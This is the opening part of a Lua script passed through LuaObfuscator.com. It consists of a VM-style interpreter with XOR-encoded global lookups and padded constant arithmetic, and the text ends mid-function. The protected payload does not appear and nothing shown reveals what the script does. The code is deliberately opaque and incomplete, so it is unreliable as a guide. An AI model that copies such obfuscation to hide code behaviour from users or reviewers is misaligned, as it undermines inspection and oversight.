--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.5) ~  Much Love, Ferib 

]]--

do
	local v0;
	local v1;
	local v2;
	local v3;
	local v4;
	local v5;
	local v6;
	local v7;
	local v8;
	local v9;
	local v10;
	local v11;
	local v12;
	local v13;
	local v14;
	local v15;
	local v16;
	local v17;
	local v18;
	local v19;
	local v20;
	local v21;
	local v22;
	local v23;
	local v24 = 0;
	while true do
		if (v24 == 6) then
			v17 = _G[v7("\67\54\77\140\137\38\169", "\36\83\57\234\236\72\223")] or function()
				return _ENV;
			end;
			v18 = _G[v7("\16\140\199\177\37\226\2\157\210\190\44\243", "\99\233\179\220\64\150")];
			v19 = _G[v7("\251\217\87\216\173", "\139\186\54\180\193\118\212\47")];
			v24 = 7;
		end
		if (1 == v24) then
			v3 = bit32 or bit;
			v4 = v3.bxor;
			v5 = table.concat;
			v24 = 2;
		end
		if (5 == v24) then
			v14 = _G[v7("\58\250\28\254\43", "\78\155\126\146")][v7("\84\244\214\43\223\237", "\55\155\184\72\190\153\82\29")];
			v15 = _G[v7("\229\76\36\29\244", "\145\45\70\113")][v7("\78\141\183\131\74\82", "\39\227\196\230\56\38\25\160")];
			v16 = _G[v7("\44\14\217\9", "\65\111\173\97\223\223\50\44")][v7("\35\12\26\38\144", "\79\104\127\94\224\130")];
			v24 = 6;
		end
		if (v24 == 4) then
			v11 = _G[v7("\199\150\39\8\210\251", "\180\226\85\97\188\156")][v7("\190\211\74", "\205\166\40\74\155\141\208\125")];
			v12 = _G[v7("\232\240\96\33\245\227", "\155\132\18\72")][v7("\73\28\109\112", "\46\111\24\18\131")];
			v13 = _G[v7("\149\67\48\251\90\67", "\230\55\66\146\52\36")][v7("\24\86\206", "\106\51\190\141\75\117\68")];
			v24 = 5;
		end
		if (v24 == 3) then
			v8 = _G[v7("\249\39\120\144\232\231\224\255", "\141\72\22\229\133\133\133")];
			v9 = _G[v7("\220\105\146\9\121\247", "\175\29\224\96\23\144\23")][v7("\212\111\166\168", "\182\22\210\205\82\235\215")];
			v10 = _G[v7("\22\41\87\82\46\141", "\101\93\37\59\64\234\107\26")][v7("\132\81\74\220", "\231\57\43\174\76\233")];
			v24 = 4;
		end
		if (v24 == 2) then
			v6 = table.insert;
			v7 = nil;
			v7 = function(v28, v29)
				local v35 = 0;
				local v36;
				while true do
					if (v35 == 1) then
						return v5(v36);
					end
					if (v35 == 0) then
						v36 = {};
						for v51 = 1, #v28 do
							v6(v36, v0(v4(v1(v2(v28, v51, v51 + 1)), v1(v2(v29, 1 + ((v51 - 1) % #v29), 1 + ((v51 - 1) % #v29) + 1))) % 256));
						end
						v35 = 1;
					end
				end
			end;
			v24 = 3;
		end
		if (v24 == 8) then
			v23 = nil;
			v23 = function(v30, v31, ...)
				local v37 = 0;
				local v38;
				local v39;
				local v40;
				local v41;
				local v42;
				local v43;
				local v44;
				local v45;
				local v46;
				local v47;
				local v48;
				local v49;
				local v50;
				while true do
					if (v37 == 2) then
						v44 = nil;
						v45 = nil;
						v46 = nil;
						v37 = 3;
					end
					if (v37 == 0) then
						v38 = 0;
						v39 = nil;
						v40 = nil;
						v37 = 1;
					end
					if (v37 == 4) then
						v50 = nil;
						while true do
							local v52 = 0;
							while true do
								if (v52 == 0) then
									if (v38 == 1) then
										local v53 = 0;
										while true do
											if (v53 == 1) then
												v42 = function()
													local v67 = 0;
													local v68;
													local v69;
													while true do
														if (v67 == 0) then
															v68 = 0 - 0;
															v69 = nil;
															v67 = 1;
														end
														if (v67 == 1) then
															while true do
																local v116 = 0;
																while true do
																	if (v116 == 0) then
																		if (v68 == (1 - 0)) then
																			return v69;
																		end
																		if (0 == v68) then
																			local v126 = 0;
																			while true do
																				if (v126 == 0) then
																					v69 = v9(v30, v39, v39);
																					v39 = v39 + (1 - 0);
																					v126 = 1;
																				end
																				if (v126 == 1) then
																					v68 = 1;
																					break;
																				end
																			end
																		end
																		break;
																	end
																end
															end
															break;
														end
													end
												end;
												v43 = nil;
												v53 = 2;
											end
											if (v53 == 0) then
												v41 = function(v59, v60, v61)
													if v61 then
														local v105 = 0;
														local v106;
														local v107;
														while true do
															if (0 == v105) then
																v106 = 0;
																v107 = nil;
																v105 = 1;
															end
															if (v105 == 1) then
																while true do
																	if (0 == v106) then
																		local v123 = 0;
																		while true do
																			if (v123 == 0) then
																				v107 = (v59 / ((4 - 2) ^ (v60 - (2 - ((37 + 159) - (33 + 162)))))) % (((1536 + 86) - (686 + 934)) ^ (((v61 - (1 + 0)) - (v60 - (1 + 0))) + ((1764 - (1007 + 755)) - (1 - 0))));
																				return v107 - (v107 % (1 - 0));
																			end
																		end
																	end
																end
																break;
															end
														end
													else
														local v108 = 0;
														local v109;
														local v110;
														while true do
															if (0 == v108) then
																v109 = 0;
																v110 = nil;
																v108 = 1;
															end
															if (v108 == 1) then
																while true do
																	if (0 == v109) then
																		local v124 = 0;
																		while true do
																			if (0 == v124) then
																				v110 = (1 + 1 + (1519 - (343 + (3025 - 1849)))) ^ (v60 - ((985 - (117 + 482)) - (250 + (2087 - (659 + 1293)))));
																				return (((v59 % (v110 + v110)) >= v110) and (((4 - 2) + 0) - (1 + 0 + 0))) or (0 + 0 + 0 + 0 + 0);
																			end
																		end
																	end
																end
																break;
															end
														end
													end
												end;
												v42 = nil;
												v53 = 1;
											end
											if (2 == v53) then
												v38 = 2;
												break;
											end
										end
									end
									if (v38 == 5) then
										local v54 = 0;
										while true do
											if (v54 == 1) then
												return v50(v49(), {}, v31)(...);
											end
											if (0 == v54) then
												v50 = nil;
												v50 = function(v62, v63, v64)
													local v70 = 0;
													local v71;
													local v72;
													local v73;
													local v74;
													while true do
														if (v70 == 2) then
															while true do
																local v117 = 0;
																while true do
																	if (v117 == 0) then
																		if (v71 == 1) then
																			local v127 = 0;
																			while true do
																				if (v127 == 0) then
																					v74 = v62[3 + 0 + 0];
																					return function(...)
																						local v149 = 0;
																						local v150;
																						local v151;
																						local v152;
																						local v153;
																						local v154;
																						local v155;
																						while true do
																							if (v149 == 0) then
																								v150 = 0;
																								v151 = nil;
																								v149 = 1;
																							end
																							if (1 == v149) then
																								v152 = nil;
																								v153 = nil;
																								v149 = 2;
																							end
																							if (3 == v149) then
																								while true do
																									if (v150 == 3) then
																										_G['A'], _G['B'] = v48(v19(v155));
																										if not _G['A'][1] then
																											local v182 = 0;
																											local v183;
																											local v184;
																											while true do
																												if (1 == v182) then
																													while true do
																														if (v183 == 0) then
																															v184 = v62[805 - (278 + 523)][v151] or "?";
																															error(v7("\226\49\171\90\193\38\249\86\195\32\182\65\145\51\173\19\234", "\177\82\217\51") .. v184 .. v7("\52\90", "\105\96\74\118") .. _G['A'][1529 - (1301 + 226)]);
																															break;
																														end
																													end
																													break;
																												end
																												if (v182 == 0) then
																													v183 = 0;
																													v184 = nil;
																													v182 = 1;
																												end
																											end
																										else
																											return v21(_G['A'], (1002 - (36 + 8)) - (763 + (2071 - (1748 + 130))), _G['B']);
																										end
																										break;
																									end
																									if (v150 == 2) then
																										local v176 = 0;
																										while true do
																											if (0 == v176) then
																												v155 = nil;
																												v155 = function()
																													local v190 = 0;
																													local v191;
																													local v192;
																													local v193;
																													local v194;
																													local v195;
																													local v196;
																													local v197;
																													local v198;
																													local v199;
																													local v200;
																													while true do
																														if (1 == v190) then
																															v195 = {};
																															v196 = {};
																															v197 = {};
																															for v201 = 0, v154 do
																																if (v201 >= v193) then
																																	v195[v201 - v193] = v153[v201 + 1 + 0];
																																else
																																	v197[v201] = v153[v201 + 1];
																																end
																															end
																															v190 = 2;
																														end
																														if (0 == v190) then
																															v191 = v72;
																															v192 = v73;
																															v193 = v74;
																															v194 = v48;
																															v190 = 1;
																														end
																														if (v190 == 2) then
																															v198 = (v154 - v193) + (1 - 0);
																															v199 = nil;
																															v200 = nil;
																															while true do
																																local v202 = 0;
																																local v203;
																																while true do
																																	if (v202 == 0) then
																																		v203 = 0;
																																		while true do
																																			if (v203 == 0) then
																																				local v220 = 0;
																																				while true do
																																					if (v220 == 0) then
																																						v199 = v191[v151];
																																						v200 = v199[1 + 0];
																																						v220 = 1;
																																					end
																																					if (v220 == 1) then
																																						v203 = 1;
																																						break;
																																					end
																																				end
																																			end
																																			if (v203 == 1) then
																																				if (v200 <= (19 - 6)) then
																																					if (v200 <= (2 + 2 + 2)) then
																																						if (v200 <= (7 - 5)) then
																																							if (v200 <= 0) then
																																								v64[v199[8 - 5]] = v197[v199[2 + 0]];
																																							elseif (v200 == (1856 - (1346 + 509))) then
																																								local v238 = 0;
																																								local v239;
																																								local v240;
																																								local v241;
																																								local v242;
																																								local v243;
																																								while true do
																																									if (v238 == 1) then
																																										v241 = nil;
																																										v242 = nil;
																																										v238 = 2;
																																									end
																																									if (v238 == 0) then
																																										v239 = 0;
																																										v240 = nil;
																																										v238 = 1;
																																									end
																																									if (v238 == 2) then
																																										v243 = nil;
																																										while true do
																																											if (v239 == 1) then
																																												local v306 = 0;
																																												while true do
																																													if (v306 == 0) then
																																														v152 = (v242 + v240) - (1 + 0);
																																														v243 = (924 + 266) - (483 + 192 + (835 - 320));
																																														v306 = 1;
																																													end
																																													if (v306 == 1) then
																																														v239 = 2;
																																														break;
																																													end
																																												end
																																											end
																																											if (v239 == 0) then
																																												local v307 = 0;
																																												while true do
																																													if (v307 == 1) then
																																														v239 = 1;
																																														break;
																																													end
																																													if (v307 == 0) then
																																														v240 = v199[3 - 1];
																																														v241, v242 = v194(v197[v240](v21(v197, v240 + 1 + 0, v199[(1489 - (281 + 1205)) + 0])));
																																														v307 = 1;
																																													end
																																												end
																																											end
																																											if (v239 == 2) then
																																												for v328 = v240, v152 do
																																													local v329 = 0;
																																													local v330;
																																													while true do
																																														if (v329 == 0) then
																																															v330 = 0;
																																															while true do
																																																if (v330 == 0) then
																																																	v243 = v243 + (1874 - ((2144 - (272 + 873)) + 874));
																																																	v197[v328] = v241[v243];
																																																	break;
																																																end
																																															end
																																															break;
																																														end
																																													end
																																												end
																																												break;
																																											end
																																										end
																																										break;
																																									end
																																								end
																																							else
																																								v197[v199[2 + 0]] = #v197[v199[2 + 1]];
																																							end
																																						elseif (v200 <= 4) then
																																							if (v200 > (6 - 3)) then
																																								local v245 = 0;
																																								local v246;
																																								local v247;
																																								while true do
																																									if (v245 == 0) then
																																										v246 = 0;
																																										v247 = nil;
																																										v245 = 1;
																																									end
																																									if (v245 == 1) then
																																										while true do
																																											if (v246 == 0) then
																																												v247 = v199[(1529 - 1083) - ((198 - 78) + (1972 - (984 + 664)))];
																																												do
																																													return v21(v197, v247, v152);
																																												end
																																												break;
																																											end
																																										end
																																										break;
																																									end
																																								end
																																							else
																																								v197[v199[42 - (7 + 33)]] = {};
																																							end
																																						elseif (v200 == 5) then
																																							local v249 = 0;
																																							local v250;
																																							local v251;
																																							while true do
																																								if (v249 == 1) then
																																									while true do
																																										if (v250 == 0) then
																																											v251 = v199[2];
																																											do
																																												return v197[v251](v21(v197, v251 + 1 + 0, v199[192 - ((1045 - (739 + 253)) + (489 - 353))]));
																																											end
																																											break;
																																										end
																																									end
																																									break;
																																								end
																																								if (v249 == 0) then
																																									v250 = 0;
																																									v251 = nil;
																																									v249 = 1;
																																								end
																																							end
																																						else
																																							do
																																								return;
																																							end
																																						end
																																					elseif (v200 <= 9) then
																																						if (v200 <= 7) then
																																							local v231 = 0;
																																							local v232;
																																							local v233;
																																							local v234;
																																							local v235;
																																							while true do
																																								if (2 == v231) then
																																									while true do
																																										if (v232 == 2) then
																																											if (v234 > ((3098 - (773 + 1169)) - (405 + 467 + (973 - 689)))) then
																																												if (v235 <= v197[v233 + (1259 - ((492 - (13 + 41)) + 126 + 694))]) then
																																													local v344 = 0;
																																													local v345;
																																													while true do
																																														if (v344 == 0) then
																																															v345 = 0;
																																															while true do
																																																if (v345 == 0) then
																																																	v151 = v199[2 + 1];
																																																	v197[v233 + (6 - (2 + 1))] = v235;
																																																	break;
																																																end
																																															end
																																															break;
																																														end
																																													end
																																												end
																																											elseif (v235 >= v197[v233 + 1]) then
																																												local v346 = 0;
																																												local v347;
																																												while true do
																																													if (0 == v346) then
																																														v347 = 0;
																																														while true do
																																															if (0 == v347) then
																																																v151 = v199[3];
																																																v197[v233 + 2 + 1] = v235;
																																																break;
																																															end
																																														end
																																														break;
																																													end
																																												end
																																											end
																																											break;
																																										end
																																										if (v232 == 0) then
																																											local v304 = 0;
																																											while true do
																																												if (0 == v304) then
																																													v233 = v199[2];
																																													v234 = v197[v233 + ((1169 - (86 + 1080)) - 1)];
																																													v304 = 1;
																																												end
																																												if (v304 == 1) then
																																													v232 = 1;
																																													break;
																																												end
																																											end
																																										end
																																										if (v232 == 1) then
																																											local v305 = 0;
																																											while true do
																																												if (v305 == 0) then
																																													v235 = v197[v233] + v234;
																																													v197[v233] = v235;
																																													v305 = 1;
																																												end
																																												if (1 == v305) then
																																													v232 = 2;
																																													break;
																																												end
																																											end
																																										end
																																									end
																																									break;
																																								end
																																								if (v231 == 1) then
																																									v234 = nil;
																																									v235 = nil;
																																									v231 = 2;
																																								end
																																								if (v231 == 0) then
																																									v232 = 0;
																																									v233 = nil;
																																									v231 = 1;
																																								end
																																							end
																																						elseif (v200 > (8 + (0 - 0))) then
																																							local v252 = 0;
																																							local v253;
																																							local v254;
																																							local v255;
																																							local v256;
																																							local v257;
																																							while true do
																																								if (v252 == 2) then
																																									v257 = nil;
																																									while true do
																																										if (v253 == 0) then
																																											local v310 = 0;
																																											while true do
																																												if (v310 == 1) then
																																													v253 = 1;
																																													break;
																																												end
																																												if (v310 == 0) then
																																													v254 = v199[768 - (107 + 659)];
																																													v255, v256 = v194(v197[v254](v21(v197, v254 + (1324 - (48 + 17 + (2107 - 849))), v152)));
																																													v310 = 1;
																																												end
																																											end
																																										end
																																										if (v253 == 2) then
																																											for v334 = v254, v152 do
																																												local v335 = 0;
																																												local v336;
																																												while true do
																																													if (v335 == 0) then
																																														v336 = 0;
																																														while true do
																																															if (0 == v336) then
																																																v257 = v257 + ((1624 - (697 + 926)) - 0);
																																																v197[v334] = v255[v257];
																																																break;
																																															end
																																														end
																																														break;
																																													end
																																												end
																																											end
																																											break;
																																										end
																																										if (1 == v253) then
																																											local v311 = 0;
																																											while true do
																																												if (v311 == 0) then
																																													v152 = (v256 + v254) - 1;
																																													v257 = 0 + 0 + 0 + 0;
																																													v311 = 1;
																																												end
																																												if (v311 == 1) then
																																													v253 = 2;
																																													break;
																																												end
																																											end
																																										end
																																									end
																																									break;
																																								end
																																								if (0 == v252) then
																																									v253 = 0;
																																									v254 = nil;
																																									v252 = 1;
																																								end
																																								if (v252 == 1) then
																																									v255 = nil;
																																									v256 = nil;
																																									v252 = 2;
																																								end
																																							end
																																						else
																																							v151 = v199[(144 - (92 + 50)) + 1];
																																						end
																																					elseif (v200 <= 11) then
																																						if (v200 > 10) then
																																							local v259 = 0;
																																							local v260;
																																							local v261;
																																							local v262;
																																							local v263;
																																							while true do
																																								if (1 == v259) then
																																									v262 = nil;
																																									v263 = nil;
																																									v259 = 2;
																																								end
																																								if (v259 == 2) then
																																									while true do
																																										if (v260 == 0) then
																																											local v312 = 0;
																																											while true do
																																												if (v312 == 1) then
																																													v260 = 1;
																																													break;
																																												end
																																												if (v312 == 0) then
																																													v261 = v199[6 - 4];
																																													v262 = v197[v261];
																																													v312 = 1;
																																												end
																																											end
																																										end
																																										if (v260 == 1) then
																																											v263 = v197[v261 + (1917 - (895 + 70 + 950))];
																																											if (v263 > ((0 - 0) - (486 - (385 + 101)))) then
																																												if (v262 > v197[v261 + (1413 - (320 + 1092))]) then
																																													v151 = v199[1459 - (261 + 1195)];
																																												else
																																													v197[v261 + ((1632 - (543 + 501)) - (377 + 170 + 38))] = v262;
																																												end
																																											elseif (v262 < v197[v261 + 1 + (522 - (442 + 80))]) then
																																												v151 = v199[1 + 2];
																																											else
																																												v197[v261 + (8 - 5) + (1170 - (29 + 1141))] = v262;
																																											end
																																											break;
																																										end
																																									end
																																									break;
																																								end
																																								if (v259 == 0) then
																																									v260 = 0;
																																									v261 = nil;
																																									v259 = 1;
																																								end
																																							end
																																						else
																																							local v264 = 0;
																																							local v265;
																																							local v266;
																																							local v267;
																																							local v268;
																																							while true do
																																								if (v264 == 0) then
																																									v265 = 0;
																																									v266 = nil;
																																									v264 = 1;
																																								end
																																								if (v264 == 2) then
																																									while true do
																																										if (v265 == 0) then
																																											local v314 = 0;
																																											while true do
																																												if (v314 == 1) then
																																													v265 = 1;
																																													break;
																																												end
																																												if (v314 == 0) then
																																													v266 = v192[v199[3]];
																																													v267 = nil;
																																													v314 = 1;
																																												end
																																											end
																																										end
																																										if (v265 == 1) then
																																											local v315 = 0;
																																											while true do
																																												if (v315 == 0) then
																																													v268 = {};
																																													v267 = v18({}, {[v7("\119\37\142\167\202\212\80", "\40\122\231\201\174\177")]=function(v353, v354)
																																														local v363 = 0;
																																														local v364;
																																														local v365;
																																														while true do
																																															if (v363 == 0) then
																																																v364 = 0;
																																																v365 = nil;
																																																v363 = 1;
																																															end
																																															if (v363 == 1) then
																																																while true do
																																																	if (v364 == 0) then
																																																		local v383 = 0;
																																																		while true do
																																																			if (0 == v383) then
																																																				v365 = v268[v354];
																																																				return v365[(562 - (452 + 108)) - 1][v365[2 + 0]];
																																																			end
																																																		end
																																																	end
																																																end
																																																break;
																																															end
																																														end
																																													end,[v7("\10\223\251\240\34\233\251\241\48\248", "\85\128\149\149")]=function(v353, v354, v355)
																																														local v366 = 0;
																																														local v367;
																																														local v368;
																																														while true do
																																															if (v366 == 1) then
																																																while true do
																																																	if (v367 == 0) then
																																																		v368 = v268[v354];
																																																		v368[(3038 - 1770) - ((703 - 308) + 872)][v368[5 - 3]] = v355;
																																																		break;
																																																	end
																																																end
																																																break;
																																															end
																																															if (v366 == 0) then
																																																v367 = 0;
																																																v368 = nil;
																																																v366 = 1;
																																															end
																																														end
																																													end});
																																													v315 = 1;
																																												end
																																												if (v315 == 1) then
																																													v265 = 2;
																																													break;
																																												end
																																											end
																																										end
																																										if (v265 == 2) then
																																											for v337 = (18 + 381) - (75 + (656 - 333)), v199[715 - (242 + 469)] do
																																												local v338 = 0;
																																												local v339;
																																												local v340;
																																												while true do
																																													if (v338 == 1) then
																																														while true do
																																															if (v339 == 1) then
																																																if (v340[1] == ((24 - 12) + (1621 - (558 + 1061)))) then
																																																	v268[v337 - (1 + 0)] = {v197,v340[3]};
																																																else
																																																	v268[v337 - 1] = {v63,v340[(24 - 15) - (16 - 10)]};
																																																end
																																																v196[#v196 + (745 - (229 + 515))] = v268;
																																																break;
																																															end
																																															if (v339 == 0) then
																																																local v374 = 0;
																																																while true do
																																																	if (v374 == 1) then
																																																		v339 = 1;
																																																		break;
																																																	end
																																																	if (v374 == 0) then
																																																		v151 = v151 + 1 + (0 - 0);
																																																		v340 = v191[v151];
																																																		v374 = 1;
																																																	end
																																																end
																																															end
																																														end
																																														break;
																																													end
																																													if (v338 == 0) then
																																														v339 = 0;
																																														v340 = nil;
																																														v338 = 1;
																																													end
																																												end
																																											end
																																											v197[v199[2 - (0 + 0)]] = v50(v266, v267, v64);
																																											break;
																																										end
																																									end
																																									break;
																																								end
																																								if (v264 == 1) then
																																									v267 = nil;
																																									v268 = nil;
																																									v264 = 2;
																																								end
																																							end
																																						end
																																					elseif (v200 > (9 + 3)) then
																																						v197[v199[2]] = v63[v199[3]];
																																					else
																																						local v271 = 0;
																																						local v272;
																																						local v273;
																																						while true do
																																							if (v271 == 0) then
																																								v272 = 0;
																																								v273 = nil;
																																								v271 = 1;
																																							end
																																							if (v271 == 1) then
																																								while true do
																																									if (v272 == 0) then
																																										v273 = v199[(984 - (936 + 43)) - 3];
																																										v197[v273] = v197[v273](v21(v197, v273 + 1 + (865 - (843 + 22)), v199[3]));
																																										break;
																																									end
																																								end
																																								break;
																																							end
																																						end
																																					end
																																				elseif (v200 <= ((2585 - 1468) - ((1710 - (1022 + 663)) + 1072))) then
																																					if (v200 <= ((1109 - (423 + 675)) + 5)) then
																																						if (v200 <= (39 - 25)) then
																																							v197[v199[111 - (46 + 63)]] = v197[v199[(1590 - (575 + 1014)) + 2]];
																																						elseif (v200 == (32 - 17)) then
																																							if not v197[v199[2]] then
																																								v151 = v151 + ((3452 - (611 + 1343)) - (513 + 819 + 165));
																																							else
																																								v151 = v199[1079 - (151 + 686 + 204 + 35)];
																																							end
																																						else
																																							v197[v199[5 - 3]] = v197[v199[(1534 - (1285 + 248)) + 2]][v199[(1307 - 545) - (196 + (1743 - (679 + 502)))]];
																																						end
																																					elseif (v200 <= ((2137 - 495) - (909 + 715))) then
																																						if (v200 == 17) then
																																							local v276 = 0;
																																							local v277;
																																							local v278;
																																							while true do
																																								if (v276 == 0) then
																																									v277 = 0;
																																									v278 = nil;
																																									v276 = 1;
																																								end
																																								if (v276 == 1) then
																																									while true do
																																										if (0 == v277) then
																																											v278 = v199[2 + 0];
																																											v197[v278] = v197[v278](v21(v197, v278 + 1, v152));
																																											break;
																																										end
																																									end
																																									break;
																																								end
																																							end
																																						else
																																							v197[v199[(2109 - (6 + 1266)) - ((686 - (36 + 451)) + (1506 - 870))]]();
																																						end
																																					elseif (v200 == (178 - (154 + 5))) then
																																						local v279 = 0;
																																						local v280;
																																						local v281;
																																						local v282;
																																						local v283;
																																						local v284;
																																						while true do
																																							if (v279 == 1) then
																																								v282 = nil;
																																								v283 = nil;
																																								v279 = 2;
																																							end
																																							if (v279 == 0) then
																																								v280 = 0;
																																								v281 = nil;
																																								v279 = 1;
																																							end
																																							if (2 == v279) then
																																								v284 = nil;
																																								while true do
																																									if (v280 == 2) then
																																										for v341 = v281, v152 do
																																											local v342 = 0;
																																											local v343;
																																											while true do
																																												if (0 == v342) then
																																													v343 = 0;
																																													while true do
																																														if (v343 == 0) then
																																															v284 = v284 + 1;
																																															v197[v341] = v282[v284];
																																															break;
																																														end
																																													end
																																													break;
																																												end
																																											end
																																										end
																																										break;
																																									end
																																									if (v280 == 1) then
																																										local v321 = 0;
																																										while true do
																																											if (v321 == 1) then
																																												v280 = 2;
																																												break;
																																											end
																																											if (v321 == 0) then
																																												v152 = (v283 + v281) - 1;
																																												v284 = 0;
																																												v321 = 1;
																																											end
																																										end
																																									end
																																									if (v280 == 0) then
																																										local v322 = 0;
																																										while true do
																																											if (v322 == 0) then
																																												v281 = v199[2];
																																												v282, v283 = v194(v197[v281](v197[v281 + (666 - (646 + 19))]));
																																												v322 = 1;
																																											end
																																											if (v322 == 1) then
																																												v280 = 1;
																																												break;
																																											end
																																										end
																																									end
																																								end
																																								break;
																																							end
																																						end
																																					else
																																						v197[v199[2]] = v199[3] + v197[v199[4]];
																																					end
																																				elseif (v200 <= (62 - (17 + 21))) then
																																					if (v200 <= ((1870 - (48 + 19)) - (1353 + 428))) then
																																						if (v200 == (2 + 10 + 9)) then
																																							v197[v199[8 - 6]] = v64[v199[3]];
																																						else
																																							v197[v199[2]] = v197[v199[3]] - v199[4];
																																						end
																																					elseif (v200 > (13 + 10)) then
																																						v197[v199[2]] = v197[v199[4 - (1 + 0)]] + v199[4];
																																					else
																																						v197[v199[1 + (2 - 1)]] = v197[v199[3]] % v199[3 + 1 + (767 - (381 + 386))];
																																					end
																																				elseif (v200 <= (45 - 19)) then
																																					if (v200 > (833 - (630 + 178))) then
																																						local v291 = 0;
																																						local v292;
																																						local v293;
																																						while true do
																																							if (v291 == 0) then
																																								v292 = 0;
																																								v293 = nil;
																																								v291 = 1;
																																							end
																																							if (v291 == 1) then
																																								while true do
																																									if (v292 == 0) then
																																										v293 = v199[286 - (131 + 153)];
																																										v197[v293](v21(v197, v293 + ((20 + 15) - (30 + (880 - (691 + 185)))), v152));
																																										break;
																																									end
																																								end
																																								break;
																																							end
																																						end
																																					else
																																						v197[v199[2 + 0]] = v197[v199[2 + 1]] % v197[v199[330 - ((2234 - (1098 + 859)) + 49)]];
																																					end
																																				elseif (v200 == ((47 + 30) - (44 + 6))) then
																																					local v295 = 0;
																																					local v296;
																																					local v297;
																																					local v298;
																																					while true do
																																						if (v295 == 1) then
																																							v298 = nil;
																																							while true do
																																								if (v296 == 1) then
																																									v197[v297 + ((4 - 3) - 0)] = v298;
																																									v197[v297] = v298[v199[1382 - (1260 + 118)]];
																																									break;
																																								end
																																								if (0 == v296) then
																																									local v327 = 0;
																																									while true do
																																										if (v327 == 0) then
																																											v297 = v199[(113 + 176) - ((289 - (176 + 45)) + 219)];
																																											v298 = v197[v199[(1 + 5) - 3]];
																																											v327 = 1;
																																										end
																																										if (v327 == 1) then
																																											v296 = 1;
																																											break;
																																										end
																																									end
																																								end
																																							end
																																							break;
																																						end
																																						if (v295 == 0) then
																																							v296 = 0;
																																							v297 = nil;
																																							v295 = 1;
																																						end
																																					end
																																				else
																																					v197[v199[2]] = v199[(30 - 16) - (11 + 0)];
																																				end
																																				v151 = v151 + 1;
																																				break;
																																			end
																																		end
																																		break;
																																	end
																																end
																															end
																															break;
																														end
																													end
																												end;
																												v176 = 1;
																											end
																											if (v176 == 1) then
																												v150 = 3;
																												break;
																											end
																										end
																									end
																									if (v150 == 1) then
																										local v177 = 0;
																										while true do
																											if (0 == v177) then
																												v153 = {...};
																												v154 = v20("#", ...) - (346 - (237 + 108));
																												v177 = 1;
																											end
																											if (1 == v177) then
																												v150 = 2;
																												break;
																											end
																										end
																									end
																									if (v150 == 0) then
																										local v178 = 0;
																										while true do
																											if (v178 == 0) then
																												v151 = 1523 - (395 + 1127);
																												v152 = -(1 + 0);
																												v178 = 1;
																											end
																											if (1 == v178) then
																												v150 = 1;
																												break;
																											end
																										end
																									end
																								end
																								break;
																							end
																							if (v149 == 2) then
																								v154 = nil;
																								v155 = nil;
																								v149 = 3;
																							end
																						end
																					end;
																				end
																			end
																		end
																		if (0 == v71) then
																			local v128 = 0;
																			while true do
																				if (v128 == 1) then
																					v71 = 1;
																					break;
																				end
																				if (0 == v128) then
																					v72 = v62[1];
																					v73 = v62[1 + 1];
																					v128 = 1;
																				end
																			end
																		end
																		break;
																	end
																end
															end
															break;
														end
														if (v70 == 0) then
															v71 = 0;
															v72 = nil;
															v70 = 1;
														end
														if (v70 == 1) then
															v73 = nil;
															v74 = nil;
															v70 = 2;
														end
													end
												end;
												v54 = 1;
											end
										end
									end
									v52 = 1;
								end
								if (v52 == 2) then
									if (v38 == 2) then
										local v55 = 0;
										while true do
											if (v55 == 1) then
												v44 = function()
													local v75 = 0;
													local v76;
													local v77;
													local v78;
													local v79;
													local v80;
													while true do
														if (2 == v75) then
															v80 = nil;
															while true do
																local v118 = 0;
																while true do
																	if (v118 == 0) then
																		if (v76 == (0 + 0)) then
																			local v129 = 0;
																			while true do
																				if (v129 == 1) then
																					v76 = 1;
																					break;
																				end
																				if (v129 == 0) then
																					v77, v78, v79, v80 = v9(v30, v39, v39 + (2 - 0) + (3 - 2));
																					v39 = v39 + 1 + 0 + 3;
																					v129 = 1;
																				end
																			end
																		end
																		if (v76 == (1 + 0)) then
																			return (v80 * ((8476778 - (443 + 87)) + (18112044 - (9811353 - (202 + 75))))) + (v79 * (47934 + 4108 + 13494)) + (v78 * ((625 + (408 - 243)) - (353 + (1162 - (99 + 882))))) + v77;
																		end
																		break;
																	end
																end
															end
															break;
														end
														if (v75 == 0) then
															v76 = 0;
															v77 = nil;
															v75 = 1;
														end
														if (v75 == 1) then
															v78 = nil;
															v79 = nil;
															v75 = 2;
														end
													end
												end;
												v45 = nil;
												v55 = 2;
											end
											if (v55 == 0) then
												v43 = function()
													local v81 = 0;
													local v82;
													local v83;
													local v84;
													while true do
														if (1 == v81) then
															v84 = nil;
															while true do
																local v119 = 0;
																while true do
																	if (v119 == 0) then
																		if (v82 == (1176 - (653 + 522))) then
																			return (v84 * (85 + 171)) + v83;
																		end
																		if (v82 == (0 - 0)) then
																			local v130 = 0;
																			while true do
																				if (v130 == 1) then
																					v82 = 572 - (293 + 278);
																					break;
																				end
																				if (0 == v130) then
																					v83, v84 = v9(v30, v39, v39 + ((10 - 6) - 2));
																					v39 = v39 + (315 - (27 + (775 - (174 + 315))));
																					v130 = 1;
																				end
																			end
																		end
																		break;
																	end
																end
															end
															break;
														end
														if (v81 == 0) then
															v82 = 0;
															v83 = nil;
															v81 = 1;
														end
													end
												end;
												v44 = nil;
												v55 = 1;
											end
											if (v55 == 2) then
												v38 = 3;
												break;
											end
										end
									end
									if (v38 == 3) then
										local v56 = 0;
										while true do
											if (v56 == 1) then
												v46 = function(v65)
													local v85 = 0;
													local v86;
													local v87;
													local v88;
													while true do
														if (v85 == 0) then
															v86 = 596 - (231 + 365);
															v87 = nil;
															v85 = 1;
														end
														if (v85 == 1) then
															v88 = nil;
															while true do
																local v120 = 0;
																while true do
																	if (v120 == 0) then
																		if (0 == v86) then
																			local v131 = 0;
																			while true do
																				if (v131 == 1) then
																					v86 = 1 + 0;
																					break;
																				end
																				if (v131 == 0) then
																					v87 = nil;
																					if not v65 then
																						local v171 = 0;
																						local v172;
																						while true do
																							if (v171 == 0) then
																								v172 = 0;
																								while true do
																									if (v172 == (58 - (26 + 32))) then
																										v65 = v44();
																										if (v65 == (81 - (69 + 12))) then
																											return "";
																										end
																										break;
																									end
																								end
																								break;
																							end
																						end
																					end
																					v131 = 1;
